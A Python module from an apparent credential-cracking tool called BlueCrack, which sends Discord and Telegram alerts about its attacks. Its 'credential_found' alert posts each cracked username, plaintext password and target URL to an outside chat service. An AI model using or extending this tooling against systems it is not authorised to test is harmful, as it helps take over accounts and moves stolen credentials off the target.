"""
BlueCrack Notifier
===================
Notification system supporting Discord webhooks and Telegram bots.
Sends non-blocking alerts when credentials are found.
"""

import html
import json
import re
import threading
from typing import Any, Dict, List

import requests


class NotificationBackend:
    """Base class for notification backends."""

    def send(self, title: str, message: str, color: int = 0x00FF00) -> bool:
        """Send a notification. Returns True on success."""
        raise NotImplementedError


class DiscordWebhook(NotificationBackend):
    """Send notifications via Discord webhook."""

    def __init__(self, webhook_url: str) -> None:
        self.webhook_url = webhook_url
        self.name = "discord"

    def send(self, title: str, message: str, color: int = 0x00FF00) -> bool:
        if not self.webhook_url:
            return False
        # Adhere to Discord embed character limits
        safe_title = str(title)[:250]
        safe_desc = str(message)[:4000]
        payload = {
            "embeds": [
                {
                    "title": safe_title,
                    "description": safe_desc,
                    "color": color,
                    "footer": {"text": "BlueCrack Notification"},
                }
            ]
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "BlueCrack-Notifier/4.2",
        }
        try:
            resp = requests.post(
                self.webhook_url,
                json=payload,
                headers=headers,
                timeout=10,
            )
            return 200 <= resp.status_code < 300
        except Exception:
            return False


class TelegramBot(NotificationBackend):
    """Send notifications via Telegram Bot API."""

    def __init__(self, bot_token: str, chat_id: str) -> None:
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.name = "telegram"

    def send(self, title: str, message: str, color: int = 0x00FF00) -> bool:
        if not self.bot_token or not self.chat_id:
            return False
        safe_title = html.escape(str(title))
        safe_msg = html.escape(str(message))
        safe_msg = re.sub(r"\*\*(.+?)\*\*", r"<b>\1</b>", safe_msg)
        safe_msg = re.sub(r"`(.+?)`", r"<code>\1</code>", safe_msg)
        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
        formatted_text = f"<b>{safe_title}</b>\n\n{safe_msg}"[:4000]
        payload = {
            "chat_id": self.chat_id,
            "text": formatted_text,
            "parse_mode": "HTML",
        }
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "BlueCrack-Notifier/4.2",
        }
        try:
            resp = requests.post(url, json=payload, headers=headers, timeout=10)
            if resp.status_code == 200:
                return True
            # Fallback to plain text if HTML entity parsing failed
            plain_payload = {
                "chat_id": self.chat_id,
                "text": f"{title}\n\n{message}"[:4000],
            }
            resp_plain = requests.post(url, json=plain_payload, headers=headers, timeout=10)
            return resp_plain.status_code == 200
        except Exception:
            return False


class Notifier:
    """Manages notification backends and dispatches alerts."""

    def __init__(self) -> None:
        self._backends: List[NotificationBackend] = []
        self._enabled = True
        self._lock = threading.Lock()

    @property
    def is_enabled(self) -> bool:
        """Check if notification dispatching is currently enabled."""
        with self._lock:
            return self._enabled

    def enable(self) -> None:
        """Enable notification dispatching."""
        with self._lock:
            self._enabled = True

    def disable(self) -> None:
        """Disable notification dispatching."""
        with self._lock:
            self._enabled = False

    def add_discord(self, webhook_url: str) -> None:
        """Add a Discord webhook backend."""
        with self._lock:
            # Remove existing discord backends
            self._backends = [
                b for b in self._backends if not isinstance(b, DiscordWebhook)
            ]
            self._backends.append(DiscordWebhook(webhook_url))

    def add_telegram(self, bot_token: str, chat_id: str) -> None:
        """Add a Telegram bot backend."""
        with self._lock:
            # Remove existing telegram backends
            self._backends = [
                b for b in self._backends if not isinstance(b, TelegramBot)
            ]
            self._backends.append(TelegramBot(bot_token, chat_id))

    def remove_discord(self) -> None:
        """Remove Discord webhook backend."""
        with self._lock:
            self._backends = [
                b for b in self._backends if not isinstance(b, DiscordWebhook)
            ]

    def remove_telegram(self) -> None:
        """Remove Telegram bot backend."""
        with self._lock:
            self._backends = [
                b for b in self._backends if not isinstance(b, TelegramBot)
            ]

    def clear(self) -> None:
        """Clear all notification backends."""
        with self._lock:
            self._backends.clear()

    def notify(self, event: str, data: Dict[str, Any]) -> None:
        """Send notification to all backends (non-blocking).

        Args:
            event: Event type (e.g., "credential_found", "attack_complete")
            data: Event data dict.
        """
        with self._lock:
            if not self._enabled:
                return

        if event == "credential_found":
            title = "🔓 Credential Found!"
            message = (
                f"**Username:** `{data.get('username', '?')}`\n"
                f"**Password:** `{data.get('password', '?')}`\n"
                f"**Target:** {data.get('target_url', '?')}"
            )
            color = 0x00FF00
        elif event == "attack_complete":
            title = "✅ Attack Complete"
            elapsed_val = 0.0
            try:
                elapsed_val = float(data.get("elapsed", 0) or 0)
            except (ValueError, TypeError):
                elapsed_val = 0.0
            message = (
                f"**Hits:** {data.get('successes', 0)}\n"
                f"**Attempted:** {data.get('attempted', 0)}\n"
                f"**Elapsed:** {elapsed_val:.1f}s"
            )
            color = 0x3498DB
        elif event == "test":
            title = "🧪 Test Notification"
            message = "BlueCrack notifications are working!"
            color = 0xF39C12
        else:
            title = f"BlueCrack: {event}"
            message = json.dumps(data, indent=2)
            color = 0x9B59B6

        with self._lock:
            backends = list(self._backends)

        for backend in backends:
            threading.Thread(
                target=backend.send,
                args=(title, message, color),
                daemon=True,
            ).start()

    def test(self) -> Dict[str, bool]:
        """Send test notification to all backends and return results."""
        results: Dict[str, bool] = {}
        with self._lock:
            backends = list(self._backends)

        for backend in backends:
            name = getattr(backend, "name", type(backend).__name__)
            results[name] = backend.send(
                "🧪 Test Notification",
                "BlueCrack notifications are working!",
                0xF39C12,
            )
        return results

    def get_config(self) -> List[Dict[str, Any]]:
        """Return configured backend info (no secrets)."""
        with self._lock:
            result = []
            for b in self._backends:
                if isinstance(b, DiscordWebhook):
                    raw_url = getattr(b, "webhook_url", "") or ""
                    masked = (raw_url[:30] + "...") if len(raw_url) > 30 else raw_url
                    result.append({
                        "type": "discord",
                        "configured": True,
                        "url": masked,
                    })
                elif isinstance(b, TelegramBot):
                    result.append({
                        "type": "telegram",
                        "configured": True,
                        "chat_id": b.chat_id,
                    })
            return result

    @property
    def has_backends(self) -> bool:
        """Check if any notification backends are configured."""
        with self._lock:
            return len(self._backends) > 0
